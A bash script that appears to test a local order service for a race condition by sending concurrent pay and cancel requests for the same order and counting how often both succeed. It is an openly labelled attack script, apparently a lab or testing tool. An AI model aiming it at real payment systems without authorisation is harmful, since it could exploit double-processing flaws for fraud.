#!/bin/bash
#
# attack.sh — sends concurrent PAY + CANCEL for the same order to trigger race condition
#
# Usage: ./attack.sh [base_url] [attempts]
#

set -euo pipefail

BASE_URL="${1:-http://localhost:8080}"
TOTAL="${2:-20}"
RACES=0
SAFE=0
OK=0
ERRORS=0

echo ""
echo "=== Race Condition Attack ==="
echo "Target:   $BASE_URL"
echo "Attempts: $TOTAL"
echo ""

if ! curl -sf "$BASE_URL/health" > /dev/null 2>&1; then
    echo "ERROR: service not reachable at $BASE_URL"
    exit 1
fi

for i in $(seq 1 "$TOTAL"); do
    # create order
    RESP=$(curl -s -X POST "$BASE_URL/orders" \
        -H "Content-Type: application/json" \
        -d "{\"customer_id\":\"user_$i\",\"items\":[{\"product_id\":\"p1\",\"quantity\":1,\"price\":49.99}]}")

    OID=$(echo "$RESP" | jq -r '.order_id // empty')
    if [ -z "$OID" ]; then
        echo "  #$(printf '%02d' $i)  ERROR  could not create order"
        ERRORS=$((ERRORS + 1))
        continue
    fi

    # send pay and cancel at the same time
    PAY_TMP=$(mktemp)
    CANCEL_TMP=$(mktemp)

    curl -s -w "\n%{http_code}" -X POST "$BASE_URL/orders/$OID/pay" \
        -H "Content-Type: application/json" \
        -d "{\"payment_id\":\"pay_$i\"}" > "$PAY_TMP" 2>/dev/null &
    PID_PAY=$!

    curl -s -w "\n%{http_code}" -X POST "$BASE_URL/orders/$OID/cancel" \
        -H "Content-Type: application/json" \
        -d "{\"reason\":\"cancel $i\"}" > "$CANCEL_TMP" 2>/dev/null &
    PID_CANCEL=$!

    wait $PID_PAY 2>/dev/null || true
    wait $PID_CANCEL 2>/dev/null || true

    PAY_CODE=$(tail -1 "$PAY_TMP")
    CANCEL_CODE=$(tail -1 "$CANCEL_TMP")
    rm -f "$PAY_TMP" "$CANCEL_TMP"

    FINAL=$(curl -s "$BASE_URL/orders/$OID" | jq -r '.status // "UNKNOWN"')

    if [ "$PAY_CODE" = "200" ] && [ "$CANCEL_CODE" = "200" ]; then
        echo "  #$(printf '%02d' $i)  RACE   pay=$PAY_CODE cancel=$CANCEL_CODE final=$FINAL"
        RACES=$((RACES + 1))
    elif [ "$PAY_CODE" = "200" ] || [ "$CANCEL_CODE" = "200" ]; then
        echo "  #$(printf '%02d' $i)  OK     pay=$PAY_CODE cancel=$CANCEL_CODE final=$FINAL"
        OK=$((OK + 1))
    elif [ "$PAY_CODE" = "409" ] && [ "$CANCEL_CODE" = "409" ]; then
        echo "  #$(printf '%02d' $i)  SAFE   pay=$PAY_CODE cancel=$CANCEL_CODE final=$FINAL"
        SAFE=$((SAFE + 1))
    else
        echo "  #$(printf '%02d' $i)  ERROR  pay=$PAY_CODE cancel=$CANCEL_CODE final=$FINAL"
        ERRORS=$((ERRORS + 1))
    fi
done

echo ""
echo "--- Results ---"
echo "  Total:  $TOTAL"
echo "  RACE:   $RACES  (both succeeded — vulnerable!)"
echo "  OK:     $OK  (one succeeded, one rejected)"
echo "  SAFE:   $SAFE  (both rejected — fail-safe)"
echo "  ERRORS: $ERRORS"
echo ""

if [ $RACES -gt 0 ]; then
    echo "VULNERABLE: $RACES/$TOTAL resulted in race condition."
else
    echo "NO RACE CONDITIONS DETECTED."
fi
echo ""